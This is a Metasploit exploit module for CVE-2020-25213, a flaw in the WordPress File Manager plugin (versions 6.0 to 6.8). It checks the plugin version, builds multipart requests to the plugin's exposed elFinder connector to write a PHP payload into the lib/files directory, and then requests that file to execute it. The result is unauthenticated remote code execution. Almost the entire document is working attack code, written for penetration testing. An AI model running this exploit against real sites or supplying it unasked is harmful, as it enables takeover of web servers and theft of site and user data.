##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress File Manager Unauthenticated Remote Code Execution',
        'Description' => %q{
          The File Manager (wp-file-manager) plugin from 6.0 to 6.8 for WordPress allows remote attackers to upload and
          execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php
          extension. This, for example, allows attackers to run the elFinder upload (or mkfile and put) command to write
          PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Alex Souza (w4fz5uck5)', # initial discovery and PoC
            'Imran E. Dawoodjee <imran [at] threathounds.com>', # msf module
          ],
        'References' =>
          [
            [ 'URL', 'https://github.com/w4fz5uck5/wp-file-manager-0day' ],
            [ 'URL', 'https://www.tenable.com/cve/CVE-2020-25213' ],
            [ 'CVE', '2020-25213' ],
          ],
        'Platform' => [ 'php' ],
        'Privileged' => false,
        'Arch' => ARCH_PHP,
        'Targets' =>
          [
            [ 'WordPress File Manager 6.0-6.8', {} ]
          ],
        'DisclosureDate' => '2020-09-09', # disclosure date on NVD, PoC was published on August 26 2020
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to WordPress installation', '/']),
        OptEnum.new('COMMAND', [true, 'elFinder commands used to exploit the vulnerability', 'upload', %w[upload mkfile+put]])
      ]
    )
  end

  def check
    begin
      return CheckCode::Unknown unless wordpress_and_online?

      # check the plugin version from readme
      check_plugin_version_from_readme('wp-file-manager', nil, 6.0)
    end
  end

  def exploit
    begin
      # carry out check before the exploit
      fail_with(Failure::NotVulnerable, 'Target is most likely not vulnerable!') unless [CheckCode::Appears].include? check
      # base path to File Manager plugin
      file_manager_base_uri = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-file-manager')
      filename = "#{Rex::Text.rand_text_alphanumeric(6)}.php"

      case datastore['COMMAND']
      when 'upload'
        elfinder_post(file_manager_base_uri, 'upload', 'payload' => payload.encoded, 'filename' => filename)
      when 'mkfile+put'
        elfinder_post(file_manager_base_uri, 'mkfile', 'filename' => filename)
        elfinder_post(file_manager_base_uri, 'put', 'payload' => payload.encoded, 'filename' => filename)
      end

      payload_uri = normalize_uri(file_manager_base_uri, 'lib', 'files', filename)
      print_status("#{peer} - Payload is at #{payload_uri}")
      # execute the payload
      send_request_cgi('uri' => normalize_uri(payload_uri))
    end
  end

  # make it easier to switch between "upload" and "mkfile+put" exploit methods
  def elfinder_post(file_manager_base_uri, elfinder_cmd, opts = {})
    # after testing, came to conclusion that we don't need any image data, the exploit works without it
    boundary = "------------------------#{Rex::Text.rand_text_hex(16)}"
    if opts['payload'] != ''
      payload = opts['payload']
    end
    filename = opts['filename']

    post_data = "#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"cmd\"\r\n\r\n"
    post_data << "#{elfinder_cmd}\r\n"
    post_data << "#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"target\"\r\n\r\n"
    # A1A2A3A4 is replaced by one of:
    # base64(filename.php) for "put"
    # nothing for "upload" and "mkfile"
    post_data << "l1_A1A2A3A4\r\n"
    post_data << "#{boundary}\r\n"
    # B1B2B3B4 is replaced by one of:
    # "upload[]"; filename="<filename>.php" for "upload"
    # "content" for "put"
    # "name" for "mkfile"
    post_data << "Content-Disposition: form-data; name=B1B2B3B4\r\n"
    # only required for "upload"
    if elfinder_cmd == 'upload'
      post_data << "Content-Type: application/octet-stream\r\n\r\n"
    end
    # C1C2C3C4 is replaced by one of:
    # payload data for "upload" and "put"
    # filename for "mkfile"
    post_data << "C1C2C3C4\r\n"
    post_data << "#{boundary}--\r\n"

    case elfinder_cmd
    when 'upload'
      post_data['A1A2A3A4'] = 'Lw'
      post_data['B1B2B3B4'] = "\"upload[]\"; filename=\"#{filename}\""
      post_data['C1C2C3C4'] = payload
    when 'mkfile'
      post_data['A1A2A3A4'] = 'Lw'
      post_data['B1B2B3B4'] = "\"name\"\r\n"
      post_data['C1C2C3C4'] = filename
    when 'put'
      post_data['A1A2A3A4'] = Rex::Text.encode_base64(filename)
      post_data['B1B2B3B4'] = "\"content\"\r\n"
      post_data['C1C2C3C4'] = payload
    end

    # the boundary in the Content-Type has 2 less hyphens than the others (!)
    # it actually has to be that way to work (!)
    res = send_request_cgi(
      'uri' => normalize_uri(file_manager_base_uri, 'lib', 'php', 'connector.minimal.php'),
      'method' => 'POST',
      'ctype' => "multipart/form-data; boundary=#{boundary[2..-1]}",
      'data' => post_data
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP response code: #{res.code}") unless res.code == 200
  end
end
